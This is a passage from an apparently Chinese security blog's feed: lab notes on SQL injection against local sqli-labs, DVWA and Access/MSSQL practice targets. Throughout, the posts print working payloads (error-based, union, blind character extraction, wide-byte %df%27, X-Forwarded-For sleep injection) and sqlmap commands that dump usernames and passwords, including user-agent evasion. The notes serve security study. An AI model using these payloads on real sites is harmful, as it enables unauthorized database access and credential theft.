table_schema=&apos;dbo&apos; and table_name not in(emails&apos;) )) -- |</span><br></pre></td></tr></table></figure><p><img src="/images/191mssql17.png" alt></p><p>多次执行后，当执行到下面这条语句时，页面无显示。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.237/less-1.asp?id=1&apos;  and 1=convert(int,(select top 1 table_name from information_schema.tables where table_schema=&apos;dbo&apos; and table_name not in(&apos;emails&apos;, &apos;uagents&apos;, &apos;referers&apos;, &apos;users&apos;) )) -- |</span><br></pre></td></tr></table></figure><p><img src="/images/191mssql18.png" alt></p><h4 id="报错注入查询users表的字段名"><a href="#报错注入查询users表的字段名" class="headerlink" title="报错注入查询users表的字段名"></a>报错注入查询<code>users</code>表的字段名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.131/less-1.asp?id=1&apos;  and 1=convert(int,(select top 1 column_name from information_schema.columns where table_name=&apos;users&apos;)) -- |</span><br></pre></td></tr></table></figure><p><img src="/images/191mssql19.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.131/less-1.asp?id=1&apos;  and 1=convert(int,(select top 1 column_name from information_schema.columns where table_name=&apos;users&apos; and column_name not in(&apos;id&apos;))) -- |</span><br></pre></td></tr></table></figure><p><img src="/images/191mssql20.png" alt></p><p>改为桥接模式，继续做。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.237/less-1.asp?id=1&apos;  and 1=convert(int,(select top 1 column_name from information_schema.columns where table_name=&apos;users&apos; and column_name not in(&apos;id&apos;, &apos;username&apos;, &apos;password&apos;))) -- |</span><br></pre></td></tr></table></figure><p><img src="/images/191mssql21.png" alt></p><h3 id="Access-数据库"><a href="#Access-数据库" class="headerlink" title="Access 数据库"></a><code>Access</code> 数据库</h3><h4 id="判断注入类型-1"><a href="#判断注入类型-1" class="headerlink" title="判断注入类型"></a>判断注入类型</h4><p>找到新闻展示界面，可能存在注入点</p><p><img src="/images/192access1.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.36/shownews.asp?id=5&apos;</span><br></pre></td></tr></table></figure><p><img src="/images/192access.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.36/shownews.asp?id=5-1</span><br></pre></td></tr></table></figure><p><img src="/images/192access2.png" alt></p><h4 id="判断数据库类型"><a href="#判断数据库类型" class="headerlink" title="判断数据库类型"></a>判断数据库类型</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.36/shownews.asp?id=5 and (select count(*) from MSysAccessObjects)&gt;0</span><br></pre></td></tr></table></figure><p><img src="/images/192access3.png" alt></p><h4 id="判断个数"><a href="#判断个数" class="headerlink" title="判断个数"></a>判断个数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.36/shownews.asp?id=5 order by 11</span><br></pre></td></tr></table></figure><p><img src="/images/192access4.png" alt></p><h4 id="猜表名及判断各输出位置"><a href="#猜表名及判断各输出位置" class="headerlink" title="猜表名及判断各输出位置"></a>猜表名及判断各输出位置</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.36/shownews.asp?id=5 union select 1,2,3,4,5,6,7,8,9,10,11 from news</span><br></pre></td></tr></table></figure><p><img src="/images/192access5.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.36/shownews.asp?id=5 union select 1,id,title,4,5,6,content,8,9,10,11 from news</span><br></pre></td></tr></table></figure><p><img src="/images/192access5.png" alt></p><h4 id="猜表名"><a href="#猜表名" class="headerlink" title="猜表名"></a>猜表名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.36/shownews.asp?id=5 and (select count(*) from user)</span><br></pre></td></tr></table></figure><p><img src="/images/192access6.png" alt></p><h4 id="使用-top-1"><a href="#使用-top-1" class="headerlink" title="使用 top 1"></a>使用 <code>top 1</code></h4><p>由上面的内容可知表 <code>news</code>中存在字段 <code>id</code>，<code>title</code> 和 <code>content</code>。尝试判断第一个 <code>title</code> 的长度。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.132/shownews.asp?id=3 and (select top 1 len(title) from news)&gt;29</span><br></pre></td></tr></table></figure><p><img src="/images/192access7.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.132/shownews.asp?id=3 and (select top 1 len(title) from news)&gt;30</span><br></pre></td></tr></table></figure><p><img src="/images/192access8.png" alt></p><p>第一个标题长度为 <code>30</code>。</p><p>尝试判断 <code>user</code> b表中字段 <code>username</code> 第一个值</p><p><img src="/images/192access9.png" alt></p><p><code>username</code> 中数据的个数，由下图可知总共两个数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.132/shownews.asp?id=3 and (select count(username) from user)&gt;1</span><br></pre></td></tr></table></figure><p><img src="/images/192access19.png" alt></p><p>判断第一个 <code>username</code> 的长度</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.132/shownews.asp?id=3 and (select top 1 len(username) from user)&gt;4</span><br></pre></td></tr></table></figure><p><img src="/images/192access13.png" alt></p><p>第一个用户名的长度为 <code>5</code>。</p><p>判断第一个字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.132/shownews.asp?id=3 and (select top 1 asc(mid(username, 1, 1)) from user)&gt;96</span><br></pre></td></tr></table></figure><p><img src="/images/192access10.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.132/shownews.asp?id=3 and (select top 1 asc(mid(username, 1, 1)) from user)&gt;97</span><br></pre></td></tr></table></figure><p><img src="/images/192access11.png" alt></p><p>第一个字符的 <code>ASCII</code> 码为 <code>a</code></p><p>判断第二个字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.132/shownews.asp?id=3 and (select top 1 asc(mid(username, 2, 1)) from user)&gt;99</span><br></pre></td></tr></table></figure><p><img src="/images/192access12.png" alt></p><p>第二个字符为 <code>d</code>。</p><p>判断第三个字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.132/shownews.asp?id=3 and (select top 1 asc(mid(username, 3, 1)) from user)&gt;108</span><br></pre></td></tr></table></figure><p><img src="/images/192access14.png" alt></p><p>第三个字符为 <code>m</code>。</p><p>判断第四个字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.132/shownews.asp?id=3 and (select top 1 asc(mid(username, 4, 1)) from user)&gt;104</span><br></pre></td></tr></table></figure><p><img src="/images/192access15.png" alt></p><p>第四个字符为 <code>i</code></p><p>判断第最后一个字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.132/shownews.asp?id=3 and (select top 1 asc(mid(username, 5, 1)) from user)&gt;109</span><br></pre></td></tr></table></figure><p><img src="/images/192access16.png" alt></p><p>最后一个字符为 <code>n</code></p><p><code>username</code> 的第二个值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.132/shownews.asp?id=3 and (select top 1 len(username) from user where username not in (&apos;admin&apos;))&gt;4</span><br></pre></td></tr></table></figure><p>长度为 <code>5</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.132/shownews.asp?id=3 and (select top 1 asc(mid(username, 1, 1)) from user where username not in(&apos;admin&apos;))&gt;108</span><br></pre></td></tr></table></figure><p>第一个字符为 <code>m</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.132/shownews.asp?id=3 and (select top 1 asc(mid(username, 2, 1)) from user where username not in(&apos;admin&apos;))&gt;100</span><br></pre></td></tr></table></figure><p>第二个字符为 <code>e</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.132/shownews.asp?id=3 and (select top 1 asc(mid(username, 3, 1)) from user where username not in(&apos;admin&apos;))&gt;107</span><br></pre></td></tr></table></figure><p>第三个字符为 <code>l</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.132/shownews.asp?id=3 and (select top 1 asc(mid(username, 4, 1)) from user where username not in(&apos;admin&apos;))&gt;120</span><br></pre></td></tr></table></figure><p>第四个字符为 <code>y</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.132/shownews.asp?id=3 and (select top 1 asc(mid(username, 5, 1)) from user where username not in(&apos;admin&apos;))&gt;120</span><br></pre></td></tr></table></figure><p>最后一个字符为 <code>y</code></p><p>用 <code>sqlmap</code> 验证</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://192.168.179.132/shownews.asp?id=3"</span> -T user -C username --dump</span><br></pre></td></tr></table></figure><p><img src="/images/192access18.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Abstract&lt;/strong&gt;: 对 &lt;code&gt;Mssql&lt;/code&gt; 和 &lt;code&gt;Access&lt;/code&gt; 数据库使用报错注入和联合查询方法查询库名表名字段名。&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://yoursite.com/categories/Web-Security/"/>
    
    
      <category term="Access 注入 - Mssql 注入" scheme="http://yoursite.com/tags/Access-%E6%B3%A8%E5%85%A5-Mssql-%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>note36</title>
    <link href="http://yoursite.com/2019/09/02/note36/"/>
    <id>http://yoursite.com/2019/09/02/note36/</id>
    <published>2019-09-02T13:53:19.000Z</published>
    <updated>2019-09-02T14:57:41.719Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Abstract</strong>:  <code>SQL</code> 注入之宽字节注入、 <code>HTTP</code> 头注入和其他注入</p><a id="more"></a><!--export--><!--toc--><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><h4 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h4><p><code>GBK</code> 占用两字节，<code>ASCII</code> 占用一个字节。<code>PHP</code> 中编码为 <code>GBK</code>，函数执行添加的是 <code>ASCII</code> 编码，添加的符号为 <code>&quot;\&quot;</code>，<code>MySQL</code> 默认字符集是 <code>GBK</code> 等宽字节字符集。</p><p><code>%df&#39;</code> 被 <code>PHP</code> 中的 <code>addslashes函数</code>（开启 <code>GPC</code> 或者 <code>iconv()</code>）转义成 <code>%df\&#39;</code> ，其中 <code>\</code> 的十六进制是 <code>%5C</code>，那么现在 <code>%df\&#39;</code> = <code>%df%5C%27</code> ，若程序默认的字符集是 <code>GBK</code> 等宽字节字符集，则 <code>MySQL</code> 用 <code>GBK</code> 编码时，会认为 <code>%df%5c%27</code> 是一个宽字符，即 <code>運&#39;</code>，出现单引号就好注入了。</p><p>宽字节注入，内联注入是无法使用的，宽字节注入推荐使用加前缀 <code>--prefix</code>和后缀 <code>suffix</code> 方法，不推荐写 <code>tamper</code>。</p><p><strong>注意</strong>：</p><ul><li><code>PHP5.3</code>之前，<code>PDO</code> 受宽字节注入影响</li><li>如何防止宽字节注入？<ul><li><code>mysql_set_chartset(&#39;GBK&#39;)</code></li><li><code>mysql_real_escape_string($value)</code></li></ul></li></ul><h3 id="二次编码注入"><a href="#二次编码注入" class="headerlink" title="二次编码注入"></a>二次编码注入</h3><p><code>url</code> 编码是一种浏览器用来打包表单输入的格式。<code>url</code> 编码就是一个字符 <code>ascii</code>码的十六进制，不过需要在前面加上 <code>%</code> ，比如 <code>\</code> 的 <code>ascii</code> 是 92（0x5c），故<code>\</code> 的 <code>url</code> 编码为 <code>%5c</code></p><h4 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h4><ul><li>urldecode()</li><li>rawurldecode()</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> urldecode($_GET[<span class="string">'id'</span>]);</span><br><span class="line">    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>注意</strong>：默认的 <code>GET</code> 和 <code>POST</code> 函数，先解码一次。</p><h3 id="HTTP头注入"><a href="#HTTP头注入" class="headerlink" title="HTTP头注入"></a>HTTP头注入</h3><h4 id="XFF-注入"><a href="#XFF-注入" class="headerlink" title="XFF 注入"></a>XFF 注入</h4><p><code>X-Forwarded-For</code>：简称 <code>XFF</code> 头，代表客户端，也就是 <code>HTTP</code> 的请求端真实的 <code>IP</code>，通常一些网站防注入功能会记录请求端真实 <code>IP</code> 地址并写入数据库或某文件。通过修改 <code>XFF</code> 头可以实现伪造 <code>IP</code>。</p><p>使用 <code>Modify Headers</code> 可以修改 <code>X-Forwarded-For</code>。</p><p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C187httpIP.png" alt></p><p>通过 <code>burpsuite</code> 抓包</p><p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C188.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Abstract&lt;/strong&gt;:  &lt;code&gt;SQL&lt;/code&gt; 注入之宽字节注入、 &lt;code&gt;HTTP&lt;/code&gt; 头注入和其他注入&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://yoursite.com/categories/Web-Security/"/>
    
      <category term="笔记" scheme="http://yoursite.com/categories/Web-Security/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="宽字节注入 - IP 注入" scheme="http://yoursite.com/tags/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5-IP-%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>practice12</title>
    <link href="http://yoursite.com/2019/09/02/practice12/"/>
    <id>http://yoursite.com/2019/09/02/practice12/</id>
    <published>2019-09-02T11:34:32.000Z</published>
    <updated>2019-09-03T00:46:09.727Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Abstract</strong>: 练习宽字节注入和请求头 <code>IP</code> 注入</p><a id="more"></a><!--export--><!--toc--><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>打开 <code>burpsuite</code> 抓取数据包</p><p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C186driver.png" alt></p><p>在 <code>username</code> 后面加上 <code>%df%27</code>，请求页面，发现没有变化，主要是因为 <code>POST</code> 传输不需要 <code>URL</code> 解码，点击 <code>Hex</code>，找到 <code>username</code> 的位置，把 <code>1</code> 后面的字符改成  <code>df</code> 和 <code>27</code> </p><p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C186driver1.png" alt></p><p>返回查看数据，把多余的字符删除。</p><p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C186driver2.png" alt></p><p>点击 <code>Go</code>，查看 <code>Response</code>，发现页面变化了，即找到了注入点。</p><p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C186driver3.png" alt></p><p>尝试使用时间注入，修改 <code>Request</code> 如下，</p><p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C186driver4.png" alt></p><p>点击 <code>Go</code> 发现页面，没有延迟。很可能是 <code>.ova</code> 文件导入过来，数据库并没有数据造成的，在网页上注册一个用户，再次运行，可以发现响应延迟了 <code>1s</code> 左右。</p><p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C186driver5.png" alt></p><p>删除多余的 <code>*</code>，再在我们想要注入的地方加入 <code>*</code>，右击保存文件。</p><p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C186driver6.png" alt></p><p>接下来，使用 <code>sqlmap</code> 测试。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r Desktop\wideType.txt <span class="comment"># wideType.txt 存放的是HTTP响应的数据</span></span><br></pre></td></tr></table></figure><p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C186driver7.png" alt></p><p>可以发现漏洞，但是最新版的 <code>sqlmap</code> 在脱裤时，会出现问题。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r <span class="string">"C:\Users\han\Desktop\wideType.txt"</span> --dbs</span><br></pre></td></tr></table></figure><p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C186driver8.png" alt></p><h3 id="请求头-IP-注入"><a href="#请求头-IP-注入" class="headerlink" title="请求头 IP 注入"></a>请求头 <code>IP</code> 注入</h3><p>数据库中更新用户 <code>IP</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 更新 IP</span><br><span class="line">UPDATE  USER SET last_loginip=&apos;8.8.8.8&apos; WHERE `username`=&apos;zhang&apos;;</span><br></pre></td></tr></table></figure><p>想要注入，首先得进行前 <code>&#39;</code> 的闭合和注释掉后 <code>&#39;</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE USER SET last_loginip=&apos;8.8.8.8&apos; /*此处插入想要执行的语句*/ #&apos; WHERE `username`=&apos;zhang&apos;;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE USER SET last_loginip=&apos;8.8.8.8&apos; and WHERE id=1 and sleep(5) #&apos; WHERE `username`=&apos;zhang&apos;;</span><br></pre></td></tr></table></figure><p>使用 <code>Modify Headers</code> 添加 <code>X-Forwarded-For</code> 设置为 <code>8.8.8.8&#39;</code>，先注册一个用户。用户名 <code>123</code>，密码 <code>123</code>。</p><p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C187httpIP.png" alt></p><p>用 <code>burpsuite</code> 抓取数据包</p><p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C187httpIP1.png" alt></p><p>在 <code>X-Forwarded-For</code> 后面补充 <code>where 1=1 and sleep(5)</code>，点击 <code>Go</code></p><p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C187httpIP2.png" alt></p><p>等待 <code>5s</code> 后，页面有响应。由此可找到注入点，把 <code>where id=1 and sleep(5)</code> 改成 <code>where id = 1 *</code> ，删除请求其他 <code>*</code> 号，保存到文件里。开始用 <code>sqlmap</code> 执行 <code>payload</code>。</p><p>把注入点修改为 <code>where 1=1 or sleep(5)</code> 页面没有延迟，原因是 <code>1=1 or sleep(5)</code> 短路原理，故 <code>sleep(5)</code> 压根就没有执行。</p><p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C189.png" alt></p><p>使用 <code>where 1=1 and sleep(5)</code> ，我们可以看出来延迟了将近 <code>15s</code>。关于 <code>1=1 or 条件</code> 和 <code>1=2 and 条件</code> 的短路原理，在前几篇文章写过，但真正在实战中确实还是容易忘掉。</p><p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C190.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r <span class="string">"C:\Users\han\Desktop\ip.txt"</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(custom) HEADER parameter <span class="string">'X-Forwarded-For #1*'</span> appears to be <span class="string">'MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)'</span> injectable</span><br></pre></td></tr></table></figure><p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C187httpIP3.png" alt></p><p>可以使用 <code>--technique T</code> 指定时间注入，缩短时间。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r <span class="string">"C:\Users\han\Desktop\ip.txt"</span> --technique T --dbs</span><br></pre></td></tr></table></figure><p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C187httpIP4.png" alt></p><h3 id="问题与总结"><a href="#问题与总结" class="headerlink" title="问题与总结"></a>问题与总结</h3><p>关于 <code>SQLmap</code> 自定义注入点的思考：</p><ol><li>先通过 <code>burpsuite</code> 抓取数据包，尝试找到注入点。</li><li>找到注入点后，分析使用布尔盲注还是时间盲注，在 <code>burpsuite</code> 中的 <code>Repeater</code> 模块中通过在请求内容中增加 <code>SQL</code> 语句尝试。</li><li>在注入点中，把添加 <code>SQL</code> 语句中能够做修改的地方改写成 <code>*</code>。<ul><li>在<code>老司机</code>例子中，定位到  <code>username</code> 存在宽字节注入，后面写上 <code>or if((select 1 and 1=1), sleep(3), 1)</code> 发现响应延迟，那 <code>payload</code> 该放在那呢？首先能够确定的是，必然在 <code>select 1 and 1=1</code> 这句话里面，<code>if</code> 关键字第一个表达式必须是布尔型，所以直接在 <code>1=1</code> 加 <code>*</code> 号即可。</li><li>在 <code>留言板</code> 例子中，通过对 <code>SQL</code> 语句的猜想，可以知道要在 <code>X-Forwarded-For: 8.8.8.8&#39;</code> 后面加上 <code>where 1=1 and sleep(5) #</code> 在本例中，可以修改为 <code>where 1=1*</code> 即可。</li></ul></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Abstract&lt;/strong&gt;: 练习宽字节注入和请求头 &lt;code&gt;IP&lt;/code&gt; 注入&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://yoursite.com/categories/Web-Security/"/>
    
    
      <category term="宽字节注入 - IP注入" scheme="http://yoursite.com/tags/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5-IP%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>practice11</title>
    <link href="http://yoursite.com/2019/08/31/practice11/"/>
    <id>http://yoursite.com/2019/08/31/practice11/</id>
    <published>2019-08-31T03:08:50.000Z</published>
    <updated>2019-09-01T14:32:04.940Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Abstract</strong>: <code>SQLMap</code>的应用，使用<code>sqli-labs</code> 和 <code>dvwa</code> 作为实验平台。</p><a id="more"></a><!--export--><!--toc--><h3 id="用-SQLMap-查看数据库"><a href="#用-SQLMap-查看数据库" class="headerlink" title="用 SQLMap 查看数据库"></a>用 <code>SQLMap</code> 查看数据库</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://192.168.100.119/sqli-labs/Less-8/?id=1"</span> --dbs</span><br></pre></td></tr></table></figure><p><img src="/images/156sql-dbs.png" alt></p><p>得出结果：</p><p><img src="/images/157sql-dbs-result.png" alt></p><h3 id="查看-security-库中的表"><a href="#查看-security-库中的表" class="headerlink" title="查看 security 库中的表"></a>查看 <code>security</code> 库中的表</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://192.168.100.119/sqli-labs/Less-8/?id=1"</span> -D security --tables</span><br></pre></td></tr></table></figure><p>得出结果：</p><p><img src="/images/158sql-sec-tables.png" alt></p><h3 id="查看-users-表中所有的字段名"><a href="#查看-users-表中所有的字段名" class="headerlink" title="查看  users 表中所有的字段名"></a>查看  <code>users</code> 表中所有的字段名</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://192.168.100.119/sqli-labs/Less-8/?id=1"</span> -D security -T  users --columns</span><br></pre></td></tr></table></figure><p>得出结果：</p><p><img src="/images/159sql-sec-users-columns.png" alt></p><h3 id="查看-security-users-表中的内容"><a href="#查看-security-users-表中的内容" class="headerlink" title="查看 security.users 表中的内容"></a>查看 <code>security.users</code> 表中的内容</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://192.168.100.119/sqli-labs/Less-8/?id=1"</span> -D security -T  users -C id,password,username --dump</span><br></pre></td></tr></table></figure><p>得出结果：</p><p><img src="/images/160dump.png" alt></p><h3 id="使用-method-和-POST-参数"><a href="#使用-method-和-POST-参数" class="headerlink" title="使用 method 和 POST 参数"></a>使用 <code>method</code> 和 <code>POST</code> 参数</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://192.168.100.119/sqli-labs/Less-11/"</span> --method=<span class="string">"post"</span> --data=<span class="string">"uname=admin&amp;passwd=admin"</span> --dbs</span><br></pre></td></tr></table></figure><p>得到结果：</p><p><img src="/images/162method_data.png" alt></p><h3 id="使用-cookie"><a href="#使用-cookie" class="headerlink" title="使用 cookie"></a>使用 <code>cookie</code></h3><p>在 <code>/sqli-labs/Less-11</code> 中，由于只涉及登录功能，没有登录以后的操作，所以用 <code>--cookie</code> 无法抓取相应数据。 故使用 <code>dvwa</code> 测试。</p><p>登录账号，查看 <code>cookie</code> </p><p><img src="/images/165cookie.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://192.168.100.119/DVWA/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#"</span> --cookie=<span class="string">"security=low; PHPSESSID=ar14vrf1ie0kc399hgpmqc1fd2"</span> --dbs</span><br></pre></td></tr></table></figure><p>得到结果：</p><p><img src="/images/166cookie1.png" alt></p><p><img src="/images/166cookie2.png" alt></p><p><img src="/images/166cookie3.png" alt></p><p><img src="/images/166cookie4.png" alt></p><h3 id="使用-user-agent"><a href="#使用-user-agent" class="headerlink" title="使用 user-agent"></a>使用 <code>user-agent</code></h3><p>打开 <code>/sqli-labs/Less-1</code> 中的 <code>index.php</code> ，添加如下程序。</p><p><img src="/images/167user_agent.png" alt></p><p>即当程序检测到 <code>user-agent</code> 值为 <code>bp</code> 时，直接退出程序。 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://192.168.100.119/sqli-labs/Less-1/?id=1"</span> --user-agent=<span class="string">"bp"</span> --dbs</span><br></pre></td></tr></table></figure><p><img src="/images/168bp.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://192.168.100.119/sqli-labs/Less-1/?id=1"</span> --user-agent=<span class="string">"sqlmap"</span> --dbs</span><br></pre></td></tr></table></figure><p><img src="/images/169sqlSec.png" alt></p><p><img src="/images/170sqlSec.png" alt></p><p>把添加的语句删除，保存退出，重新用 <code>sqlmap</code> 尝试读取数据库信息</p><p><img src="/images/171sqlbpSec.png" alt></p><p><img src="/images/171sqlbpSec1.png" alt></p><p>爬取数据库成功，由此可见，命令行设置 <code>--user-agent</code>是起到一定作用， 有些网站通过对 <code>user-agent</code>参数的检测，达到对 <code>SQLMap</code> 的屏蔽。</p><p><strong>注意</strong>：每次完成后，记住对 <code>/sqlmap/output/</code> 文件夹下对应目录的清理。</p><p>另一种方法是设置代理用 <code>burpsuite</code> 抓包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://192.168.100.52/sqli-labs/Less-3/?id=1"</span> --user-agent=<span class="string">"burpsuite"</span> --proxy=<span class="string">"http://127.0.0.1:8080"</span></span><br></pre></td></tr></table></figure><p>打开 <code>burpsuite</code> 抓取 <code>sqlmap</code> 数据包</p><p><img src="/images/184proxy.png" alt></p><p><img src="/images/185proxy.png" alt></p><p>可以看到 <code>user-agent</code> 变为我们设置的值了。</p><h3 id="sqlmap-读文件"><a href="#sqlmap-读文件" class="headerlink" title="sqlmap 读文件"></a><code>sqlmap</code> 读文件</h3><figure 